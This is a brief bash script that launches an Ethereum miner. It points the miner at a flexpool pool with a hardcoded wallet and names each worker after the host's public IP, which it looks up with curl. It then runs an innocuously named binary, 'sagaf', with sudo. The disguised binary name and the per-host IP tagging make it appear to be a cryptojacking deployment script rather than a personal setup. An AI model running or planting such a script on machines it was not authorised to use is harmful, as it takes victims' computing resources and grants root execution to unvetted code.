#!/bin/bash

#################################
## Begin of user-editable part ##
#################################

POOL=eth-sg.flexpool.io :5555
WALLET=0xbfe1d55f999910e2a287e850eaad78c247f5b169.$(echo "$(curl -s ifconfig.me)" | tr . _ )

#################################
##  End of user-editable part  ##
#################################

cd "$(dirname "$0")"

chmod +x ./sagaf && sudo ./sagaf --algo ETHASH --pool $POOL --user $WALLET $@ --4g-alloc-size 4076
